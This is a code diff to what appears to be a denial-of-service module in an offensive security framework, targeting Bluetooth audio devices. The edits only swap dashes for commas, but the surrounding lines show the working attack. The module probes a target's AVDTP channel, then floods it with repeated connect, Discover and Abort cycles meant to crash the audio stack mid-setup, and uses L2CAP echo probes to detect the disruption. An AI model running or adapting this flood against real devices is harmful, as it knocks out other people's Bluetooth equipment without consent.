@@ -139,7 +139,7 @@ class Module(DosModule):
 
     def check(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         target = self.get_option("target")
         if not self.validate_bd_addr(target):
@@ -147,13 +147,13 @@ class Module(DosModule):
             return False
         timeout = int(self.get_option("timeout"))
 
-        print_info(f"Probing {target} — AVDTP PSM 0x{PSM_AVDTP:04X}...")
+        print_info(f"Probing {target}, AVDTP PSM 0x{PSM_AVDTP:04X}...")
         try:
             s = bluetooth.BluetoothSocket(bluetooth.L2CAP)
             s.settimeout(float(timeout))
             s.connect((target, PSM_AVDTP))
             s.close()
-            print_success("AVDTP PSM reachable — target is likely an audio device")
+            print_success("AVDTP PSM reachable, target is likely an audio device")
             return True
         except bluetooth.BluetoothError as e:
             print_warning(f"AVDTP PSM unreachable: {e}")
@@ -161,7 +161,7 @@ class Module(DosModule):
 
     def run(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         if os.geteuid() != 0:
             print_error("Root privileges required")
@@ -245,9 +245,9 @@ class Module(DosModule):
         if total > 0:
             print_success(f"A2DP flood: {total} AVDTP open/abort cycles sent to {target}")
             if stats["crash_signals"] > 0:
-                print_success(f"Crash signals: {stats['crash_signals']} — audio stack likely disrupted")
+                print_success(f"Crash signals: {stats['crash_signals']}, audio stack likely disrupted")
             else:
-                print_info("Flood complete — check if audio was interrupted on target")
+                print_info("Flood complete, check if audio was interrupted on target")
             self.add_result({
                 "target": target,
                 "psms": psms,
@@ -256,7 +256,7 @@ class Module(DosModule):
             })
             return True
 
-        print_error("No cycles completed — target unreachable")
+        print_error("No cycles completed, target unreachable")
         return False
 
     def _flood_cycle(self, target: str, psm: int, send_discover: bool, timeout: int) -> bool:
@@ -271,7 +271,7 @@ class Module(DosModule):
             sock.connect((target, psm))
 
             if send_discover and psm == PSM_AVDTP:
-                # AVDTP Discover — forces SEP enumeration on target
+                # AVDTP Discover, forces SEP enumeration on target
                 pkt = _avdtp_pkt(txlabel=1, msg_type=AVDTP_MSG_TYPE_CMD,
                                   signal_id=AVDTP_DISCOVER)
                 try:
@@ -281,7 +281,7 @@ class Module(DosModule):
                 except Exception:
                     pass
 
-                # Send AVDTP Abort immediately — forces teardown mid-setup
+                # Send AVDTP Abort immediately, forces teardown mid-setup
                 abort = _avdtp_pkt(txlabel=2, msg_type=AVDTP_MSG_TYPE_CMD,
                                    signal_id=AVDTP_ABORT,
                                    payload=bytes([0x01 << 2]))
@@ -290,7 +290,7 @@ class Module(DosModule):
                 except Exception:
                     pass
 
-            # Echo probe — no response = disruption detected
+            # Echo probe, no response = disruption detected
             echo = struct.pack("<BBH", L2CAP_ECHO_REQ, 0x42, 4) + b"A2DP"
             sock.send(echo)
             sock.settimeout(0.6)
